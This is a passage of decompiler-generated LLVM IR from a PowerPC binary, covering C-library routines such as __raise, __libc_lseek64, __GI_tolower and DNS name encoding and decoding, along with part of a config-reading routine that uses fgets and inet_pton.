  %v2_10012f20 = inttoptr i32 %v0_10012f1c to i8*
  %v3_10012f20 = call i32 @__GI_strcoll(i8* %v2_10012f20, i32 %v2_10012f18)
  %v3_10012f24 = icmp eq i32 %v3_10012f20, 0
  br i1 %v3_10012f24, label %dec_label_pc_10012f5c, label %dec_label_pc_10012fa4

dec_label_pc_10012f30:                            ; preds = %dec_label_pc_10012f44.preheader, %dec_label_pc_10012f40
  %v1_10012f30 = phi i32 [ %v1_10012f48, %dec_label_pc_10012f40 ], [ 4, %dec_label_pc_10012f44.preheader ]
  %v0_10012f4c31 = phi i32 [ %v0_10012f4c, %dec_label_pc_10012f40 ], [ %v0_10012f4c29, %dec_label_pc_10012f44.preheader ]
  %v0_10012f30 = load i32, i32* @r30, align 4
  %v2_10012f30 = add i32 %v0_10012f30, %v1_10012f30
  %v3_10012f30 = inttoptr i32 %v2_10012f30 to i32*
  %v4_10012f30 = load i32, i32* %v3_10012f30, align 4
  store i32 %v4_10012f30, i32* @r4, align 4
  %v2_10012f34 = call i32 @__GI_strcasecmp(i32 %v0_10012f4c31, i32 %v4_10012f30)
  %v3_10012f38 = icmp eq i32 %v2_10012f34, 0
  %v0_10012f54.pre = load i32, i32* @r31, align 4
  br i1 %v3_10012f38, label %dec_label_pc_10012f30.dec_label_pc_10012f54_crit_edge, label %dec_label_pc_10012f40

dec_label_pc_10012f40:                            ; preds = %dec_label_pc_10012f30
  %v1_10012f40 = add i32 %v0_10012f54.pre, 1
  store i32 %v1_10012f40, i32* @r31, align 4
  %v1_10012f44 = load i32, i32* @r29, align 4
  %v2_10012f44 = icmp slt i32 %v1_10012f40, %v1_10012f44
  %v1_10012f48 = mul i32 %v1_10012f40, 4
  store i32 %v1_10012f48, i32* %r0.global-to-local, align 4
  %v0_10012f4c = load i32, i32* %r15.global-to-local, align 4
  store i32 %v0_10012f4c, i32* @r3, align 4
  br i1 %v2_10012f44, label %dec_label_pc_10012f30, label %dec_label_pc_10012f54

dec_label_pc_10012f30.dec_label_pc_10012f54_crit_edge: ; preds = %dec_label_pc_10012f30
  %v1_10012f54.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10012f54

dec_label_pc_10012f54:                            ; preds = %dec_label_pc_10012f40, %dec_label_pc_10012f30.dec_label_pc_10012f54_crit_edge, %dec_label_pc_10012f44.preheader
  %v1_10012f54 = phi i32 [ %v1_10012f54.pre, %dec_label_pc_10012f30.dec_label_pc_10012f54_crit_edge ], [ %v1_10012f4423, %dec_label_pc_10012f44.preheader ], [ %v1_10012f44, %dec_label_pc_10012f40 ]
  %v0_10012f54 = phi i32 [ %v0_10012f54.pre, %dec_label_pc_10012f30.dec_label_pc_10012f54_crit_edge ], [ 1, %dec_label_pc_10012f44.preheader ], [ %v1_10012f40, %dec_label_pc_10012f40 ]
  %v2_10012f54 = icmp slt i32 %v0_10012f54, %v1_10012f54
  br i1 %v2_10012f54, label %dec_label_pc_10012f5c, label %dec_label_pc_10012fa4

dec_label_pc_10012f5c:                            ; preds = %dec_label_pc_10012f18, %dec_label_pc_10012f54
  %v0_10012f5c = load i32, i32* %r19.global-to-local, align 4
  %v3_10012f5c = icmp eq i32 %v0_10012f5c, 2
  br i1 %v3_10012f5c, label %dec_label_pc_10012f64, label %dec_label_pc_10012f80

dec_label_pc_10012f64:                            ; preds = %dec_label_pc_10012f5c
  %v0_10012f64 = load i32, i32* @r30, align 4
  %v1_10012f64 = inttoptr i32 %v0_10012f64 to i32*
  %v2_10012f64 = load i32, i32* %v1_10012f64, align 4
  %v0_10012f6c = load i32, i32* @r25, align 4
  store i32 268513140, i32* @lr, align 4
  %v3_10012f70 = inttoptr i32 %v2_10012f64 to i8*
  %v4_10012f70 = call i32 @inet_pton(i32 2, i8* %v3_10012f70, i32 %v0_10012f6c)
  %v2_10012f74 = icmp sgt i32 %v4_10012f70, 0
  br i1 %v2_10012f74, label %dec_label_pc_10012dc4, label %dec_label_pc_10012fa0

dec_label_pc_10012f80:                            ; preds = %dec_label_pc_10012f5c
  %v3_10012f80 = icmp eq i32 %v0_10012f5c, 10
  br i1 %v3_10012f80, label %dec_label_pc_10012f88, label %dec_label_pc_10012fa0

dec_label_pc_10012f88:                            ; preds = %dec_label_pc_10012f80
  %v0_10012f88 = load i32, i32* @r30, align 4
  %v1_10012f88 = inttoptr i32 %v0_10012f88 to i32*
  %v2_10012f88 = load i32, i32* %v1_10012f88, align 4
  %v0_10012f90 = load i32, i32* %r21.global-to-local, align 4
  store i32 268513176, i32* @lr, align 4
  %v3_10012f94 = inttoptr i32 %v2_10012f88 to i8*
  %v4_10012f94 = call i32 @inet_pton(i32 10, i8* %v3_10012f94, i32 %v0_10012f90)
  %v2_10012f98 = icmp sgt i32 %v4_10012f94, 0
  br i1 %v2_10012f98, label %dec_label_pc_10012df4, label %dec_label_pc_10012fa0

dec_label_pc_10012fa0:                            ; preds = %dec_label_pc_10012f64, %dec_label_pc_10012f80, %dec_label_pc_10012f88
  store i32 2, i32* @r26, align 4
  br label %dec_label_pc_10012fa4

dec_label_pc_10012fa4:                            ; preds = %dec_label_pc_10012f54, %dec_label_pc_10012f18, %dec_label_pc_10012ef0, %dec_label_pc_10012fa0, %dec_label_pc_10012e3c
  %v0_10012fa4 = load i32, i32* @r24, align 4
  %v0_10012fa8 = load i32, i32* @r27, align 4
  %v0_10012fac = load i32, i32* @r20, align 4
  store i32 268513204, i32* @lr, align 4
  %v3_10012fb0 = call i32 @fgets(i32 %v0_10012fa4, i32 %v0_10012fa8, i32 %v0_10012fac)
  %v3_10012fb4 = icmp eq i32 %v3_10012fb0, 0
  br i1 %v3_10012fb4, label %dec_label_pc_10012fbc, label %dec_label_pc_10012e4c

dec_label_pc_10012fbc:                            ; preds = %dec_label_pc_10012fa4, %dec_label_pc_10012f04, %dec_label_pc_10012e20
  %v0_10012fbc = load i32, i32* %r18.global-to-local, align 4
  %v3_10012fbc = icmp eq i32 %v0_10012fbc, 1
  br i1 %v3_10012fbc, label %dec_label_pc_10012fd4, label %dec_label_pc_10012fc4

dec_label_pc_10012fc4:                            ; preds = %dec_label_pc_10012fbc
  %v0_10012fc4 = load i32, i32* @r20, align 4
  store i32 ptrtoint (i32* @global_var_10012fcc.966 to i32), i32* @lr, align 4
  %v1_10012fc8 = inttoptr i32 %v0_10012fc4 to i16*
  %v2_10012fc8 = call i32 @__GI_fclose(i16* %v1_10012fc8)
  br label %dec_label_pc_10012fd4

dec_label_pc_10012fd0:                            ; preds = %dec_label_pc_10012d88, %dec_label_pc_10012d58, %dec_label_pc_10012d50, %dec_label_pc_10012d44, %dec_label_pc_10012d34, %dec_label_pc_10012d1c, %dec_label_pc_10012d0c
  store i32 34, i32* @r26, align 4
  br label %dec_label_pc_10012fd4

dec_label_pc_10012fd4:                            ; preds = %dec_label_pc_10012fbc, %dec_label_pc_10012fc4, %dec_label_pc_10012db4, %dec_label_pc_10012fd0
  store i32 %v0_10012cd0, i32* %r0.global-to-local, align 4
  %v0_10012fd8 = load i32, i32* @r26, align 4
  ret i32 %v0_10012fd8

; uselistorder directives
  uselistorder i32 %v0_10012f4c, { 1, 0 }
  uselistorder i32 %v1_10012f40, { 1, 0, 2, 3 }
  uselistorder i32 %v1_10012ef4, { 1, 0 }
  uselistorder i32 %v0_10012ef0, { 1, 0 }
  uselistorder i32 %v3_10012e805, { 1, 0 }
  uselistorder i32 %v0_10012e802, { 1, 0 }
  uselistorder i32 %v1_10012eac, { 1, 0 }
  uselistorder i32 %v0_10012ea4, { 1, 0, 2 }
  uselistorder i32 %v2_10012e54, { 1, 0 }
  uselistorder i32 %v0_10012d44, { 1, 0, 2, 3 }
  uselistorder i32 %v0_10012d1c.pr, { 1, 0, 2 }
  uselistorder i32 %v1_10012ce8, { 4, 3, 2, 1, 0 }
  uselistorder i32* %r9.global-to-local, { 5, 6, 7, 8, 9, 3, 2, 4, 10, 11, 0, 1 }
  uselistorder i32* %r21.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r19.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 4, 15, 3, 16, 0, 23, 17, 18, 1, 19, 20, 22, 21, 2, 24, 25, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 26, 27, 28, 29, 30 }
  uselistorder i32 34, { 5, 6, 10, 1, 2, 3, 7, 8, 4, 0, 9 }
  uselistorder i32 (i16*)* @__GI_fclose, { 4, 5, 0, 1, 2, 3 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 1, 0, 2 }
  uselistorder i32 10, { 12, 32, 33, 34, 35, 36, 37, 38, 23, 24, 20, 21, 22, 40, 39, 41, 42, 6, 45, 1, 27, 2, 28, 0, 7, 13, 48, 14, 25, 15, 26, 31, 8, 29, 30, 16, 9, 4, 5, 19, 43, 44, 17, 3, 11, 10, 47, 18, 46 }
  uselistorder i32 (i8*, i32)* @__GI_strcoll, { 31, 32, 33, 34, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30 }
  uselistorder i32 6, { 28, 29, 30, 31, 32, 0, 1, 2, 20, 21, 22, 23, 10, 11, 35, 3, 24, 25, 6, 4, 26, 12, 27, 5, 13, 14, 15, 16, 17, 7, 8, 18, 9, 19, 33, 34 }
  uselistorder i32* @global_var_1002e5b0, { 0, 3, 1, 4, 5, 2, 6, 7 }
  uselistorder i32 12, { 45, 46, 47, 0, 48, 49, 50, 14, 18, 51, 67, 8, 9, 10, 15, 52, 29, 30, 31, 32, 33, 34, 35, 36, 5, 6, 37, 38, 39, 73, 19, 43, 65, 20, 68, 69, 70, 71, 4, 21, 72, 1, 2, 7, 22, 3, 16, 55, 56, 57, 58, 74, 40, 41, 53, 54, 23, 24, 25, 26, 27, 28, 11, 12, 13, 42, 17, 44, 59, 60, 61, 62, 63, 64, 66 }
  uselistorder i32 80, { 4, 3, 2, 1, 0, 5, 6 }
  uselistorder i32 48, { 24, 10, 11, 12, 1, 13, 14, 5, 15, 16, 2, 17, 18, 19, 7, 20, 6, 21, 3, 0, 22, 23, 25, 26, 8, 9, 4 }
  uselistorder i32 36, { 5, 6, 7, 8, 9, 10, 11, 12, 13, 3, 4, 2, 0, 1, 14 }
  uselistorder i32 -48, { 3, 5, 4, 6, 1, 2, 0 }
  uselistorder i32 16, { 55, 13, 56, 57, 14, 58, 59, 0, 60, 61, 1, 62, 15, 63, 64, 29, 30, 65, 75, 76, 66, 67, 68, 69, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 87, 44, 4, 26, 24, 52, 25, 77, 78, 91, 92, 93, 94, 70, 71, 45, 46, 47, 48, 49, 50, 88, 89, 90, 72, 2, 73, 74, 16, 17, 27, 28, 18, 7, 6, 8, 10, 9, 19, 51, 20, 23, 53, 5, 54, 21, 79, 80, 81, 82, 83, 84, 22, 85, 3, 86, 11, 12 }
  uselistorder i32* @r27, { 46, 47, 48, 49, 50, 51, 1, 52, 53, 54, 55, 12, 13, 6, 14, 3, 2, 56, 57, 58, 59, 64, 0, 65, 66, 67, 68, 76, 77, 78, 79, 80, 81, 23, 24, 88, 4, 89, 7, 90, 95, 15, 16, 86, 87, 82, 83, 84, 85, 91, 92, 93, 25, 26, 69, 70, 71, 27, 28, 5, 29, 30, 31, 32, 8, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 9, 10, 11, 21, 22, 94, 72, 73, 74, 75, 44, 45, 60, 61, 62, 63, 17, 18, 19, 20 }
  uselistorder i32 32, { 57, 58, 59, 26, 60, 61, 27, 17, 18, 66, 68, 42, 28, 25, 43, 44, 14, 15, 37, 38, 36, 2, 3, 4, 16, 13, 64, 62, 63, 45, 46, 29, 47, 48, 49, 50, 51, 52, 53, 0, 69, 70, 65, 39, 40, 41, 1, 21, 54, 55, 56, 22, 30, 67, 31, 6, 5, 8, 19, 7, 32, 10, 9, 33, 34, 12, 20, 11, 35, 23, 24 }
  uselistorder i32* @r10, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 4, {}
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_10012fd4, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_10012fa4, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_10012fa0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10012f5c, { 1, 0 }
  uselistorder label %dec_label_pc_10012f54, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10012f30, { 1, 0 }
  uselistorder label %dec_label_pc_10012ef0, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10012e80.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10012ed0, { 1, 0 }
  uselistorder label %dec_label_pc_10012e68, { 1, 0 }
  uselistorder label %dec_label_pc_10012e3c, { 1, 0 }
  uselistorder label %dec_label_pc_10012e20, { 1, 0 }
  uselistorder label %dec_label_pc_10012d88, { 1, 0 }
  uselistorder label %dec_label_pc_10012d1c, { 1, 0 }
}

define i32 @__raise(i32 %arg1) local_unnamed_addr {
entry:
  %v0_10012fec = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 268513284, i32* @lr, align 4
  %v0_10013000 = call i32 @__libc_getpid()
  %v0_10013008 = load i32, i32* @r29, align 4
  store i32 %v0_10012fec, i32* @lr, align 4
  %v2_10013018 = call i32 @kill(i32 %v0_10013000, i32 %v0_10013008)
  ret i32 %v2_10013018

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 3, 2, 1, 0 }
  uselistorder i32 ()* @__libc_getpid, { 0, 3, 2, 1 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_1001301c = load i32, i32* @lr, align 4
  store i32 140, i32* %r0.global-to-local, align 4
  %v0_10013048 = call i32 @__asm_mfcr()
  %v1_1001304c = and i32 %v0_10013048, 268435456
  %v3_1001304c = icmp eq i32 %v1_1001304c, 0
  store i32 %v0_10013048, i32* %r31.global-to-local, align 4
  store i32 %v0_10013048, i32* %r0.global-to-local, align 4
  br i1 %v3_1001304c, label %dec_label_pc_10013070, label %dec_label_pc_10013060

dec_label_pc_10013060:                            ; preds = %entry
  %v0_10013060 = call i32 @__errno_location()
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_10013068 = load i32, i32* %r31.global-to-local, align 4
  %v2_10013068 = inttoptr i32 %v0_10013060 to i32*
  store i32 %v0_10013068, i32* %v2_10013068, align 4
  %v0_10013074.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10013074

dec_label_pc_10013070:                            ; preds = %entry
  %v3_10013058 = icmp eq i32 %v0_10013048, 0
  br i1 %v3_10013058, label %dec_label_pc_10013080, label %dec_label_pc_10013074

dec_label_pc_10013074:                            ; preds = %dec_label_pc_10013070, %dec_label_pc_10013060
  %v0_10013074 = phi i32 [ %v0_10013048, %dec_label_pc_10013070 ], [ %v0_10013074.pre, %dec_label_pc_10013060 ]
  %tmp = icmp slt i32 %v0_10013074, 0
  %v1_10013078 = zext i1 %tmp to i32
  %v2_10013078 = ashr i32 %v0_10013074, 31
  %v3_10013078 = and i32 %v2_10013078, -2
  %v4_10013078 = or i32 %v3_10013078, %v1_10013078
  br label %dec_label_pc_10013088

dec_label_pc_10013080:                            ; preds = %dec_label_pc_10013070
  %v3_10013080 = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_10013088

dec_label_pc_10013088:                            ; preds = %dec_label_pc_10013074, %dec_label_pc_10013080
  %v0_10013098 = phi i32 [ %v4_10013078, %dec_label_pc_10013074 ], [ %v3_10013080, %dec_label_pc_10013080 ]
  store i32 %v0_1001301c, i32* %r0.global-to-local, align 4
  ret i32 %v0_10013098

; uselistorder directives
  uselistorder i32 %v0_10013074, { 1, 0 }
  uselistorder i32 %v0_10013048, { 0, 3, 2, 1, 4 }
  uselistorder i32 -2, { 8, 9, 10, 2, 20, 3, 5, 11, 12, 7, 1, 0, 13, 14, 15, 17, 18, 16, 19, 6, 21, 22, 4 }
  uselistorder i32 31, { 8, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 9, 10, 1, 2, 42, 43, 11, 12, 13, 29, 30, 3, 4, 0, 6, 5, 14, 15, 16, 50, 51, 48, 49, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 41, 7, 44, 45, 46, 47 }
  uselistorder i32 ()* @__errno_location, { 60, 50, 67, 66, 65, 49, 48, 59, 58, 47, 18, 44, 57, 56, 29, 52, 5, 4, 3, 2, 1, 24, 0, 13, 36, 35, 62, 61, 64, 63, 42, 23, 34, 22, 43, 9, 8, 55, 54, 53, 6, 46, 45, 15, 51, 17, 16, 41, 31, 30, 40, 28, 12, 20, 27, 19, 39, 38, 33, 26, 25, 37, 14, 11, 10, 7, 68, 32, 21 }
  uselistorder i32 268435456, { 4, 7, 19, 11, 5, 22, 23, 24, 25, 26, 16, 21, 6, 20, 0, 9, 10, 1, 12, 28, 17, 13, 18, 2, 8, 14, 15, 3, 27, 29, 30, 31 }
  uselistorder i32 140, { 1, 0 }
  uselistorder label %dec_label_pc_10013088, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  %v1_1001309c = add i32 %arg1, 128
  %v1_100130a0 = mul i32 %arg1, 2
  %v2_100130a4 = icmp ugt i32 %v1_1001309c, 383
  %v0_100130a8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_100130a4, i32 %v0_100130a8)
  %v3_100130b0 = load i32, i32* bitcast (i32** @global_var_1002e5e4.864 to i32*), align 4
  %v2_100130b4 = add i32 %v1_100130a0, %v3_100130b0
  %v3_100130b4 = inttoptr i32 %v2_100130b4 to i16*
  %v4_100130b4 = load i16, i16* %v3_100130b4, align 2
  %v5_100130b4 = sext i16 %v4_100130b4 to i32
  ret i32 %v5_100130b4

; uselistorder directives
  uselistorder i32 128, { 19, 0, 1, 22, 23, 5, 6, 20, 4, 7, 8, 12, 13, 14, 15, 9, 16, 17, 18, 2, 10, 11, 21, 3 }
}

define i32 @__encode_dotted(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_100130c0 = load i32, i32* @lr, align 4
  store i32 %v0_100130c0, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v0_100130cc = load i32, i32* @r4, align 4
  store i32 %v0_100130cc, i32* @r29, align 4
  %v0_100130d0 = load i32, i32* @r5, align 4
  store i32 %v0_100130d0, i32* %r27.global-to-local, align 4
  store i32 0, i32* @r28, align 4
  %v3_1001313c13 = icmp eq i8* %arg1, null
  store i32 %tmp, i32* @r3, align 4
  br i1 %v3_1001313c13, label %dec_label_pc_10013158, label %dec_label_pc_1001314c

dec_label_pc_100130e0:                            ; preds = %dec_label_pc_1001314c
  store i32 268513508, i32* @lr, align 4
  %v3_100130e0 = call i32 @__GI_strchr(i32 %v0_1001314c14, i32 46)
  store i32 %v3_100130e0, i32* @r30, align 4
  %v3_100130e4 = icmp eq i32 %v3_100130e0, 0
  %v0_100130e8 = load i32, i32* @r31, align 4
  store i32 %v0_100130e8, i32* @r3, align 4
  %v2_100130ec = sub i32 %v3_100130e0, %v0_100130e8
  store i32 %v2_100130ec, i32* %r0.global-to-local, align 4
  br i1 %v3_100130e4, label %dec_label_pc_100130f4, label %dec_label_pc_100130fc

dec_label_pc_100130f4:                            ; preds = %dec_label_pc_100130e0
  %v0_100130f4 = call i32 @__GI_strlen()
  store i32 %v0_100130f4, i32* %r3.global-to-local, align 4
  %sext = mul i32 %v0_100130f4, 16777216
  %v1_100130f8 = sdiv i32 %sext, 16777216
  store i32 %v1_100130f8, i32* %r0.global-to-local, align 4
  %v0_1001310c.pre = load i32, i32* @r31, align 4
  %v0_1001311c.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_100130fc

dec_label_pc_100130fc:                            ; preds = %dec_label_pc_100130e0, %dec_label_pc_100130f4
  %v0_1001311c = phi i32 [ %v3_100130e0, %dec_label_pc_100130e0 ], [ %v0_1001311c.pre, %dec_label_pc_100130f4 ]
  %v0_1001310c = phi i32 [ %v0_100130e8, %dec_label_pc_100130e0 ], [ %v0_1001310c.pre, %dec_label_pc_100130f4 ]
  %v0_10013128 = phi i32 [ %v2_100130ec, %dec_label_pc_100130e0 ], [ %v1_100130f8, %dec_label_pc_100130f4 ]
  %v0_10013100 = load i32, i32* @r28, align 4
  %v1_10013100 = load i32, i32* %r27.global-to-local, align 4
  %v2_10013100 = sub i32 %v1_10013100, %v0_10013100
  %v1_10013104 = add i32 %v0_10013100, 1
  store i32 %v1_10013104, i32* %r11.global-to-local, align 4
  %v1_10013108 = add i32 %v2_10013100, -1
  store i32 %v0_1001310c, i32* @r4, align 4
  %v0_10013110 = load i32, i32* @r29, align 4
  %v2_10013110 = add i32 %v0_10013110, %v1_10013104
  store i32 %v2_10013110, i32* @r3, align 4
  store i32 %v0_10013128, i32* @r5, align 4
  %v2_10013118 = icmp ult i32 %v0_10013128, %v1_10013108
  %v1_1001311c = add i32 %v0_1001311c, 1
  store i32 %v1_1001311c, i32* @r31, align 4
  %v3_100130fc.not = icmp ne i32 %v0_10013128, 0
  %or.cond = and i1 %v2_10013118, %v3_100130fc.not
  br i1 %or.cond, label %dec_label_pc_10013128, label %dec_label_pc_10013170

dec_label_pc_10013128:                            ; preds = %dec_label_pc_100130fc
  %v3_10013128 = trunc i32 %v0_10013128 to i8
  %v4_10013128 = add i32 %v0_10013110, %v0_10013100
  %v5_10013128 = inttoptr i32 %v4_10013128 to i8*
  store i8 %v3_10013128, i8* %v5_10013128, align 1
  %v0_1001312c = load i32, i32* %r11.global-to-local, align 4
  %v1_1001312c = load i32, i32* %r0.global-to-local, align 4
  %v2_1001312c = add i32 %v1_1001312c, %v0_1001312c
  store i32 %v2_1001312c, i32* @r28, align 4
  store i32 268513588, i32* @lr, align 4
  %v0_10013130 = call i32 @memcpy()
  store i32 %v0_10013130, i32* %r3.global-to-local, align 4
  %v0_10013134 = load i32, i32* @r30, align 4
  %v3_10013134 = icmp eq i32 %v0_10013134, 0
  br i1 %v3_10013134, label %dec_label_pc_10013158, label %dec_label_pc_10013128.dec_label_pc_1001313c_crit_edge

dec_label_pc_10013128.dec_label_pc_1001313c_crit_edge: ; preds = %dec_label_pc_10013128
  %v0_1001313c.pre = load i32, i32* @r31, align 4
  %v3_1001313c = icmp eq i32 %v0_1001313c.pre, 0
  store i32 %v0_1001313c.pre, i32* @r3, align 4
  br i1 %v3_1001313c, label %dec_label_pc_10013158, label %dec_label_pc_1001314c

dec_label_pc_1001314c:                            ; preds = %entry, %dec_label_pc_10013128.dec_label_pc_1001313c_crit_edge
  %v0_1001314c14 = phi i32 [ %v0_1001313c.pre, %dec_label_pc_10013128.dec_label_pc_1001313c_crit_edge ], [ %tmp, %entry ]
  %v1_1001314c = inttoptr i32 %v0_1001314c14 to i8*
  %v2_1001314c = load i8, i8* %v1_1001314c, align 1
  %v3_1001314c = zext i8 %v2_1001314c to i32
  store i32 %v3_1001314c, i32* %r0.global-to-local, align 4
  %v3_10013150 = icmp eq i8 %v2_1001314c, 0
  br i1 %v3_10013150, label %dec_label_pc_10013158, label %dec_label_pc_100130e0

dec_label_pc_10013158:                            ; preds = %dec_label_pc_10013128.dec_label_pc_1001313c_crit_edge, %dec_label_pc_10013128, %dec_label_pc_1001314c, %entry
  %v0_10013158 = load i32, i32* %r27.global-to-local, align 4
  %tmp10 = icmp slt i32 %v0_10013158, 1
  br i1 %tmp10, label %dec_label_pc_10013170, label %dec_label_pc_10013160

dec_label_pc_10013160:                            ; preds = %dec_label_pc_10013158
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10013164 = load i32, i32* @r28, align 4
  %v1_10013164 = add i32 %v0_10013164, 1
  store i32 %v1_10013164, i32* %r3.global-to-local, align 4
  %v1_10013168 = load i32, i32* @r29, align 4
  %v4_10013168 = add i32 %v1_10013168, %v0_10013164
  %v5_10013168 = inttoptr i32 %v4_10013168 to i8*
  store i8 0, i8* %v5_10013168, align 1
  %v0_10013184.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10013174

dec_label_pc_10013170:                            ; preds = %dec_label_pc_100130fc, %dec_label_pc_10013158
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10013174

dec_label_pc_10013174:                            ; preds = %dec_label_pc_10013160, %dec_label_pc_10013170
  %v0_10013184 = phi i32 [ %v0_10013184.pre, %dec_label_pc_10013160 ], [ -1, %dec_label_pc_10013170 ]
  store i32 %v0_100130c0, i32* %r0.global-to-local, align 4
  ret i32 %v0_10013184

; uselistorder directives
  uselistorder i32 %v0_1001314c14, { 1, 0 }
  uselistorder i32 %v0_1001313c.pre, { 0, 2, 1 }
  uselistorder i32 %v0_10013128, { 1, 0, 3, 2 }
  uselistorder i32 %v1_100130f8, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 5, 3, 2, 4, 6 }
  uselistorder i32 16777216, { 1, 0, 2 }
  uselistorder i32 ()* @__GI_strlen, { 12, 27, 26, 11, 10, 18, 17, 16, 28, 9, 25, 24, 22, 23, 21, 20, 19, 15, 14, 13, 8, 0, 7, 6, 4, 5, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 4, 3, 2, 12, 11, 10, 9, 8, 7, 6, 5, 1, 0 }
  uselistorder i32 46, { 0, 4, 3, 5, 6, 7, 1, 2 }
  uselistorder label %dec_label_pc_10013174, { 1, 0 }
  uselistorder label %dec_label_pc_10013170, { 1, 0 }
  uselistorder label %dec_label_pc_10013158, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1001314c, { 1, 0 }
  uselistorder label %dec_label_pc_100130fc, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %v0_1001318c = call i32 @__asm_mfcr()
  store i32 %v0_1001318c, i32* @r26, align 4
  %v3_10013198 = icmp eq i32 %v0_1001318c, 0
  store i32 %arg2, i32* @r25, align 4
  %v0_100131a8 = load i32, i32* @r6, align 4
  store i32 %v0_100131a8, i32* @r24, align 4
  br i1 %v3_10013198, label %dec_label_pc_10013260, label %dec_label_pc_100131b0

dec_label_pc_100131b0:                            ; preds = %entry
  store i32 1, i32* @r23, align 4
  store i32 0, i32* %r27.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v1_1001323c14 = load i32, i32* @r4, align 4
  %v2_1001323c15 = add i32 %v1_1001323c14, %v0_1001318c
  %v3_1001323c16 = inttoptr i32 %v2_1001323c15 to i8*
  %v4_1001323c17 = load i8, i8* %v3_1001323c16, align 1
  %v5_1001323c18 = zext i8 %v4_1001323c17 to i32
  store i32 %v5_1001323c18, i32* @r31, align 4
  store i1 false, i1* %cr4_eq.global-to-local, align 1
  %v3_1001324420 = icmp eq i8 %v4_1001323c17, 0
  br i1 %v3_1001324420, label %dec_label_pc_10013250, label %dec_label_pc_100131c0

dec_label_pc_100131c0:                            ; preds = %dec_label_pc_100131b0, %dec_label_pc_10013238
  %v3_1001324022 = phi i1 [ %v3_10013240, %dec_label_pc_10013238 ], [ false, %dec_label_pc_100131b0 ]
  %v5_1001323c21 = phi i32 [ %v5_1001323c, %dec_label_pc_10013238 ], [ %v5_1001323c18, %dec_label_pc_100131b0 ]
  br i1 %v3_1001324022, label %dec_label_pc_100131c8, label %dec_label_pc_100131c4

dec_label_pc_100131c4:                            ; preds = %dec_label_pc_100131c0
  %v0_100131c4 = load i32, i32* %r27.global-to-local, align 4
  %v1_100131c4 = add i32 %v0_100131c4, 1
  store i32 %v1_100131c4, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_100131c8

dec_label_pc_100131c8:                            ; preds = %dec_label_pc_100131c0, %dec_label_pc_100131c4
  %v1_100131c8 = call i32 @__asm_rlwinm(i32 %v5_1001323c21, i32 0, i32 24, i32 25)
  %v0_100131cc = load i32, i32* @r4, align 4
  %v1_100131cc = add i32 %v0_100131cc, 1
  store i32 %v1_100131cc, i32* @r30, align 4
  %v3_100131d0 = icmp eq i32 %v1_100131c8, 192
  br i1 %v3_100131d0, label %dec_label_pc_100131d8, label %dec_label_pc_100131f8

dec_label_pc_100131d8:                            ; preds = %dec_label_pc_100131c8
  %v0_100131d8 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_100131d8, label %dec_label_pc_100131e0, label %dec_label_pc_100131dc

dec_label_pc_100131dc:                            ; preds = %dec_label_pc_100131d8
  %v0_100131dc = load i32, i32* %r27.global-to-local, align 4
  %v1_100131dc = add i32 %v0_100131dc, 1
  store i32 %v1_100131dc, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_100131e0

dec_label_pc_100131e0:                            ; preds = %dec_label_pc_100131d8, %dec_label_pc_100131dc
  %v0_100131e0 = load i32, i32* @r26, align 4
  %v2_100131e0 = add i32 %v0_100131e0, %v1_100131cc
